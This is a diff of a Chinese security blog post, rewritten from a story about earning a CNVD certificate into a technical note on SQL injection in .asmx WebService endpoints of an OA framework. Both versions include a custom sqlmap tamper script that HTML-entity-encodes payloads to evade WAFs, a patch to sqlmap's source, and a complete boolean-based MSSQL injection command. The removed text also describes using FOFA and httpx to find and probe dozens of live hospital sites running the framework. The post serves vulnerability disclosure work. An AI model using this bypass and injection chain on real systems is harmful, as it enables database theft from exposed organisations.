@@ -19,13 +19,13 @@ if (!doNotTrack) {
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
       
-  通用型CNVD证书初体验 &ndash; 春田花花幼稚园
+  WSDL注入绕过及SQLMAP自动化实现 &ndash; 春田花花幼稚园
 
     </title>
     
     
-    <meta name="description" property="og:description" content="安服仔保不齐所有漏洞，特别是Nday也没资源，加上又不是渗透能手。
-只好尽地主之便宜，榨取所有，即白盒审计。
+    <meta name="description" property="og:description" content="二编，展示SQL注入测试必要的技术链条细节。
+本文的故事版姐妹篇参见文末参考阅读。
 |blog under go1f.github.io">
     
 
@@ -94,7 +94,7 @@ if (!doNotTrack) {
 
 <div class="Subhead">
   <div class="Subhead-heading">
-    <div class="h1 mt-3 mb-1">通用型CNVD证书初体验</div>
+    <div class="h1 mt-3 mb-1">WSDL注入绕过及SQLMAP自动化实现</div>
   </div>
   <div class="Subhead-description">
     
@@ -118,86 +118,15 @@ if (!doNotTrack) {
 <article>
   
   <section class="pb-6 mb-3 border-bottom">
-    <p>安服仔保不齐所有漏洞，特别是Nday也没资源，加上又不是渗透能手。</p>
-<p>只好尽地主之便宜，榨取所有，即白盒审计。</p>
-<p>缘起客户又怕事又怕死的本质，一季度完了，欲壑难填，又接力一季度渗透。年底去短暂干了会驻场渗透。</p>
-<p>那个OA框架也属实是个漏洞库，偶尔出一两个RCE，被人批量提交收到通报在所难免。</p>
-<p>故意获得一份代码，一枚C#开发的古老OA型网站框架。</p>
-<h2 id="前期">前期</h2>
-<p>为何说古老，在以往黑盒渗透，就碰见了asmx后缀的页面，这些页面风格复古。往往页面详尽列出接口功能，支持XML格式提交，往往不需要身份验证，往往毫无注入防护。就像JAVA类网站潮流用Swagger UI的未授权访问。</p>
-<p>既然白盒，首先好奇到底有多少个ASMX的页面。列举了潜在的目标。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">glob</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">flist</span> <span class="o">=</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="s2">&#34;**/*.asmx&#34;</span><span class="p">,</span><span class="n">recursive</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">flist</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
-</span></span></code></pre></div><p>路径有了，几十个，当时第一个想到就是用扫描器批量扫。</p>
-<p>成熟的扫描器，应该让它自己找漏洞了。</p>
-<p>无果，AppSCAN的接口半自动扫描，要联动API测试工具(SoapUI/Postman等)逐个逐个点，AWVS、Xray似乎也无从扫起。</p>
-<p>也想过写脚本提取这些接口做成一个个数据请求包，觉得造轮子但又没找到现成的。</p>
-<p>不了了之。</p>
-<p><a href="https://xz.aliyun.com/t/7541">浅析接口安全之WebService</a></p>
-<p>拖延了几个星期，又回来，手动审吧。发现asmx文件只是壳，一般只开头写一句，引用XXXX库，找具体的库文件，原来是dll，久仰。</p>
-<p>还好，<a href="https://blog.csdn.net/kongwei521/article/details/54927689">C#逆向工具</a>很多，搜了一下，<a href="https://github.com/dnSpy/dnSpy">dnSpy-net</a>看着比较好。</p>
-<p>前端时间看到dnSpy-net被伪造了假官网，针对安全人员的投毒。吓了一下，我才刚进圈用用工具就被套了？还好是在GitHub下载的。</p>
-<p>傻瓜式操作的工具，拖dll文件进去，就可以了。界面像VScode。像我这样定向的轻量审计非常够用。</p>
-<p>一开头，瞄准了登录功能，WSLogin接口，莫名的有一个文件读取的接口，还能直接传入文件绝对路径，我当时是愣一愣。token参数还有注入，万能密码就绕过了，轻易斩获一枚SQL注入、一枚任意文件读取。</p>
-<p>接着，搜搜厂家，确认了是千万厂商，嘻嘻。上CNVD官网看看提交格式要求、漏洞标题命名什么的，搜索到厂家这个框架显示的漏洞不多，任意文件读取还是有，注入提交的也不多。</p>
-<p>有撞洞的可能。</p>
-<h2 id="收集期">收集期</h2>
-<p>先收集一下案例吧。</p>
-<p>fofa。那时候.so还能用。</p>
-<p>关键字比较重要，发现网站标题都写着“某某医院 — xxxoffice hospital”</p>
-<p>利用这个规律，顺利找到3、40个案例。搜索词没记下来，大概这样。</p>
-<pre tabindex="0"><code>title=&#34;xxxoffice hospital&#34;
-</code></pre><p>从朋友、评论区听说的通用型要20个案例起，本人比较害怕案例不够吞漏洞。</p>
-<p>比较怂，默默地照单全收，案例越多越好。</p>
-<p>接着手工验证了一下这些地址。</p>
-<p>咦？接口不存在？换一个站吧。才发现很多网站都没这个接口。唉。</p>
-<p>这个也许官方已经修补过了。看来只是我的客户维护比较渣。</p>
-<p>再咦？有WAF？小心翼翼的改掉敏感词。这样下去，搞不定啊，怎么凑够20+案例。</p>
-<p>心是有点凉。当晚漫无目的地看了几个接口，看起来漏洞也没这么多，碰到些钉子。</p>
-<p>觉得不行，还是把收集到的案例进行提前探测，确认有足够案例才开始审计，不然审出漏洞，才发现案例不够就嘥气。</p>
-<p>批量请求就要提一下<a href="https://github.com/projectdiscovery/httpx">httpx</a>。这些细致又精致的小工具，真好。</p>
-<p>拼接主机域名+asmx的路径，形成一个几千条的URL文件。贴出的入门几年如一日水平的代码：</p>
-<pre tabindex="0"><code>fhost = open(&#34;xxxxoffice-targets.txt&#34;,&#34;r&#34;)
-fpath = open(&#34;asmx.txt&#34;,&#34;r&#34;)
-hosts = list()
-for l in fhost:
-    hosts.append(l.replace(&#34;\n&#34;,&#34;&#34;))
-
-asmxs = list()
-for l in fpath:
-    asmxs.append(l.replace(&#34;\n&#34;,&#34;&#34;))
-
-urls = list()
-for h in hosts:
-    for asmx in asmxs:
-        urls.append(h+asmx)
-print(urls)
-</code></pre><p>命令大概如下，主要观察返回的响应码、标题、响应包大小，就可以一窥这个接口版本有没改动。</p>
-<pre tabindex="0"><code>./httpx -l urls.txt -status-code -title -content-length
-</code></pre><p>最后，Sublime Text、Excel一波数据整理，汇总，排列。</p>
-<p>重点关注排头的接口，还是遇到钉子，注入点不是百分百，有些还是用上了预编译的。</p>
-<p>最后还是周折地调试着if-else-switch-case找到一个注入。</p>
-<p>记下笔记就还是心灰灰停歇了一两个星期？</p>
-<p>头上依然有多朵乌云，其一是绕WAF。</p>
-<h2 id="攻坚期">攻坚期</h2>
-<p>某周末回到家，中午吃完饭不知怎的，开了电脑，研究起了SQLmap怎么利用（因为SQL漏洞CNVD提交有SQLmap命令一栏要填）。</p>
-<p>仔细看了SQLmap手册，掌握了几个非常适合定制的参数。</p>
-<p>特别是现在这个布尔型注入。</p>
-<pre tabindex="0"><code>参数添加前缀：--prefix
-参数添加后缀：--suffix
-当布尔为假而匹配响应包字符串：--not-string
-注入类型指定布尔型：--technique=B
-burpsuite调试用：--proxy=http://127.0.0.1:8080
-还有-v3、--level=3等，后来发现非必要，减掉了。
-</code></pre><p>同时，burp抓流量调试发现，SQLMap对XML格式的请求参数的<code>&amp;</code>符号自动做HTML实体编码。</p>
-<p>一试发现，服务器端是支持实体编码解码的！</p>
-<p>天然的绕WAF！</p>
-<p>实测，市面上的大多数都没有实体编码的检测。面对客户的云WAF，直接打过去哈哈。</p>
-<p>确实为之一振。</p>
-<p>折腾一下，又模仿了一下tamper写法，弄了一个字符串全部实体编码的脚本。</p>
+    <p>二编，展示SQL注入测试必要的技术链条细节。</p>
+<p>本文的故事版姐妹篇参见文末参考阅读。</p>
+<h2 id="wsdl">WSDL</h2>
+<p>黑盒渗透，曾碰见了asmx后缀的页面，风格复古，页面详尽列出接口功能，支持XML格式提交，往往不需要身份验证，往往也缺乏注入防护。</p>
+<p>这里获得一份源码，开始对WSDL接口进行审计。dll文件使用<a href="https://github.com/dnSpy/dnSpy">dnSpy-net</a>做逆向。</p>
+<p>周折地调试着if-else-switch-case找到一个注入。</p>
+<p>接着Burp偶然发现，XML参数内容做HTML实体编码，服务器端是支持识别的！天然的绕WAF！</p>
+<h2 id="sqlmap">SQLMAP</h2>
+<p>于是乎写了一个htmlencodeall.tamper，实现字符串全部实体编码。</p>
 <pre tabindex="0"><code>import re
 from lib.core.enums import PRIORITY
 
@@ -213,23 +142,21 @@ def tamper(payload, **kwargs):
     return re.sub(r&#34;[^\&amp;]&#34;, lambda match: &#34;&amp;#%d;&#34; % ord(match.group(0)), payload) if payload else payload
 
 # print(tamper(&#34;1&#39; AND SLEEP(5)#&#34;))
-</code></pre><p>同时，因为SQLmap会对<code>&amp;</code>做实体编码，需要魔改，以1.5版本为例，sqlmap-1.5/lib/request/connect.py:1001行。删除掉<code>.replace('&amp;', &quot;&amp;amp;&quot;)</code>，就可以了。</p>
-<p>学到了新的知识，很有有新鲜感。</p>
-<p>完整的命令如下，怕死，提交的时候加了randomcase,space2morecomment这些tamper，因为有些厉害的WAF还是检测到了攻击。</p>
-<pre tabindex="0"><code>python2 sqlmap-1.5/sqlmap.py -r req1 --random-agent --prefix=&#34;ap&#39;or 8999-9=8990&#34; --suffix=&#34;--isk0-&#34; --not-string=\&lt;GetEmpRightResult\&gt;-1 --technique=B --dbms=mssql --tamper randomcase,space2morecomment,htmlencodeall --threads=3 --dbs --batch
-</code></pre><h2 id="收获期">收获期</h2>
-<p>整理文档，格式调整。打包poc工具。</p>
-<p>截图。三十多个网站，一点一点贴网址，发送，截图，粘贴。其实，CNVD要求3个以上案例。当然，我还没敢当真。</p>
-<p>也害怕中途杀出太多强力WAF凑不够数。</p>
-<p>反正截多了，乏味。想到，其它证书都得交钱考，这个看似免费的证书，要点技术不说，是很耗时间。</p>
-<p>这些通用型的，忙的大咖们拿到几个证书填填简历后就懒得交了吧。</p>
-<p>录像。</p>
-<p>Gnome下的自带快捷键挺好。ALT+CTRL+SHIFT+R。只是只有20秒，于是就优化SQLMAP，让它赶快的，20秒出dump数据库的结果，哈哈。</p>
-<p>后来发现可以改的，调成无限制时间：</p>
-<pre tabindex="0"><code>gsettings set org.gnome.settings-daemon.plugins.media-keys max-screencast-length 0
-</code></pre><p>提交。</p>
-<p>接下来，就是祈望不要撞洞、不要厂商拒收历史漏洞。</p>
-<p>一个多月后，已经是年后，调休完上班登录企业微信，同事早几天就发证书给我了。</p>
+</code></pre><p>同时，因为SQLmap本来会对<code>&amp;</code>做一遍实体编码，而实体编码<code>&amp;#</code>开头，需要做一些修改魔改，以1.5版本为例，sqlmap-1.5/lib/request/connect.py:1001行。删除掉<code>.replace('&amp;', &quot;&amp;amp;&quot;)</code>，就可以了。</p>
+<p>再仔细看了SQLmap手册，掌握了几个非常适合定制的参数。特别是布尔型注入。</p>
+<pre tabindex="0"><code>参数添加前缀：--prefix
+参数添加后缀：--suffix
+当布尔为假而匹配响应包字符串：--not-string
+注入类型指定布尔型：--technique=B
+burpsuite调试用：--proxy=http://127.0.0.1:8080
+还有-v3、--level=3
+</code></pre><p>在数据包的参数位置添加*号，完整的测试命令如下</p>
+<pre tabindex="0"><code>python2 sqlmap-1.5/sqlmap.py -r req1.txt --random-agent --prefix=&#34;ap&#39;or 8999-9=8990&#34; --suffix=&#34;--isk0-&#34; --not-string=\&lt;GetResult\&gt;-1 --technique=B --dbms=mssql --tamper htmlencodeall --threads=3 --dbs --batch
+</code></pre><p><strong>参考阅读</strong></p>
+<p><a href="https://xz.aliyun.com/t/7541">浅析接口安全之WebService</a></p>
+<p><a href="https://github.com/dnSpy/dnSpy">dnSpy-net</a></p>
+<p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
+<p><a href="https://mp.weixin.qq.com/s/8Br3t6q4B2IUitqfFOJ5TQ">一枚注入通用型CNVD回顾</a></p>
   </section>
 
   <section>
@@ -246,12 +173,10 @@ def tamper(payload, **kwargs):
           
   
     <div id="toc" class="Box Box--blue mb-3">
-      <b>通用型CNVD证书初体验</b><nav id="TableOfContents">
+      <b>WSDL注入绕过及SQLMAP自动化实现</b><nav id="TableOfContents">
   <ul>
-    <li><a href="#前期">前期</a></li>
-    <li><a href="#收集期">收集期</a></li>
-    <li><a href="#攻坚期">攻坚期</a></li>
-    <li><a href="#收获期">收获期</a></li>
+    <li><a href="#wsdl">WSDL</a></li>
+    <li><a href="#sqlmap">SQLMAP</a></li>
   </ul>
 </nav></div>
   
